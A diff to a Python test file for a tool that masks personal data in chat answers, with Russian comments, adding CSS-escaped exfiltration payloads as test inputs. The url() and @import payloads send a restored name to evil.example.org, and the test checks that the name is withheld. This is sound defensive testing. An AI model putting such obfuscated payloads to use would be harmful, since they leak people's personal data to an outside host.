@@ -2,7 +2,7 @@ import ipaddress
 
 import pytest
 
-from cleaner.core.entities import hostmap, netmap, ops
+from cleaner.core.entities import hostmap, labels, netmap, ops
 from cleaner.core.pipeline import sanitize
 from cleaner.core.restore import RestoreResult, StreamRestorer, restore
 from cleaner.core.types import ChatRule, ChatState, Entity, Policy, Settings, Surrogate, default_policies
@@ -1623,9 +1623,14 @@ def test_escaped_label_in_a_long_tail_is_held_whole(settings):
     "[ссылка](https://evil.example.org/?q= <PERSON_1> ) дальше",
     '<style>a{background:url("https://evil.example.org/?q= <PERSON_1> ")}</style> дальше',
     "[1]: <https://evil.example.org/?q= <PERSON_1> > дальше",
+    "<style>a{background:url(\\2f\\2f evil\\2f?q=<PERSON_1> )}</style> дальше",
+    "<style>a{background:u\\72l(\\2f\\2f evil\\2f?q=<PERSON_1> )}</style> дальше",
+    '<style>@\\69mport "https://evil.example.org/?q= <PERSON_1> ";</style> дальше',
 ])
 def test_label_inside_a_link_not_yet_closed_is_never_shown_restored(settings, answer):
-    """Обзор этапа 3: пока ссылка не закрыта, нельзя решить, посторонняя ли она, — показ стоит перед ней."""
+    """Обзор этапа 3: пока ссылка не закрыта, нельзя решить, посторонняя ли она, — показ стоит перед ней. Ревью
+    24.10.2026: начало ссылки CSS узнаётся и в экранированной записи, как в полном разборе: «u\\72l(\\2f\\2f evil…» без
+    «)» показывалось восстановленным — адрес без «//» и без домена верхнего уровня до «)» ссылкой не находится."""
     state = person_state()
     whole = restore(state, answer, settings).text
     assert "Иван Петров" not in whole
@@ -1683,7 +1688,9 @@ def test_restorer_setup_asks_the_suffix_list_once_per_dotted_label(settings, mon
     asked = []
     extract = hostmap._extract
     monkeypatch.setattr(hostmap, "_extract", lambda name: asked.append(name) or extract(name))
-    hostmap.has_known_suffix.cache_clear()          # ответы, запомненные другими тестами, скрыли бы вызовы
+    # Ответы, запомненные другими тестами, скрыли бы вызовы: tests/test_long_input.py собирает те же значения.
+    hostmap.has_known_suffix.cache_clear()
+    labels._domain_name.cache_clear()
     state = ChatState(chat_id="many", net_key=bytes(32))
     for n in range(1, 301):
         entity = Entity(f"e{n}", T.ACCOUNT, n, f"i.ivanov{n}", f"i.ivanov{n}", "detector")
